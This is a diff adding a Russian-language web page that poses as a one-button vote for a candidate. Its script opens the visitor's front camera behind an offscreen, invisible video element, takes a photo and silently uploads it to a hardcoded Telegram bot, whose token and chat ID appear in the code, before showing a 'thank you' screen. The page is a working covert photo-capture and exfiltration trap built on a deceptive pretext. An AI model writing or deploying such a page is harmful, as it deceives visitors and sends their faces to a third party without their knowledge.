@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Голосование</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            overflow: hidden;
+            font-family: 'Arial', sans-serif;
+            background: #fff;
+            color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        #start-screen, #thanks-screen {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            transition: opacity 0.5s ease;
+        }
+        #start-screen {
+            z-index: 2;
+        }
+        #thanks-screen {
+            z-index: 1;
+            opacity: 0;
+            pointer-events: none;
+        }
+        h1 {
+            font-size: 1.5em;
+            font-weight: 400;
+            margin-bottom: 20px;
+            text-align: center;
+            padding: 0 20px;
+            max-width: 90%;
+            line-height: 1.4;
+        }
+        button {
+            padding: 10px 30px;
+            font-size: 1em;
+            background: #fff;
+            border: 1px solid #000;
+            border-radius: 0;
+            color: #000;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        button:hover {
+            background: #000;
+            color: #fff;
+        }
+        #video {
+            position: absolute;
+            top: -9999px; /* Убираем за пределы экрана */
+            left: -9999px;
+            opacity: 0; /* Скрываем визуально */
+        }
+        #canvas {
+            display: none;
+        }
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 1.2em;
+                padding: 0 15px;
+            }
+            button {
+                font-size: 0.9em;
+                padding: 8px 25px;
+            }
+        }
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 1em;
+            }
+            button {
+                font-size: 0.8em;
+                padding: 6px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="start-screen">
+        <h1>Вы желаете проголосовать за этого кандидата?</h1>
+        <button id="vote-btn">Да</button>
+    </div>
+    <div id="thanks-screen">
+        <h1>Спасибо</h1>
+    </div>
+    <video id="video" width="640" height="480" autoplay muted></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <script>
+        const startScreen = document.getElementById('start-screen');
+        const thanksScreen = document.getElementById('thanks-screen');
+        const voteBtn = document.getElementById('vote-btn');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        voteBtn.addEventListener('click', async () => {
+            try {
+                // Запрашиваем доступ к камере
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { 
+                        facingMode: 'user', // Фронтальная камера
+                        width: { ideal: 640 }, // Стандартное разрешение
+                        height: { ideal: 480 }
+                    }
+                });
+                video.srcObject = stream;
+
+                // Ждём загрузки видео
+                video.onloadeddata = () => {
+                    // Даём камере 1.5 секунды на фокусировку
+                    setTimeout(() => {
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const photoData = canvas.toDataURL('image/png');
+
+                        // Останавливаем камеру
+                        stream.getTracks().forEach(track => track.stop());
+
+                        // Отправляем фото в Telegram
+                        const token = "8169191018:AAHWIGIQ8WvUvlX6e_9RrbFVcfnbza_Qkb0";
+                        const chatId = "2068847868";
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', dataURLtoBlob(photoData), 'vote_photo.png');
+
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(response => {
+                            if (response.ok) {
+                                // Переключаем экраны
+                                startScreen.style.opacity = '0';
+                                setTimeout(() => {
+                                    startScreen.style.display = 'none';
+                                    thanksScreen.style.opacity = '1';
+                                    thanksScreen.style.pointerEvents = 'auto';
+                                }, 500);
+                            } else {
+                                console.error('Ошибка отправки в Telegram');
+                            }
+                        })
+                        .catch(error => console.error('Ошибка:', error));
+                    }, 1500); // Задержка 1.5 секунды для фокуса
+                };
+            } catch (err) {
+                console.error('Ошибка доступа к камере:', err);
+                alert('Не удалось получить доступ к камере. Проверь разрешение!');
+            }
+        });
+
+        // Функция для преобразования dataURL в Blob
+        function dataURLtoBlob(dataURL) {
+            const byteString = atob(dataURL.split(',')[1]);
+            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+    </script>
+</body>
+</html>
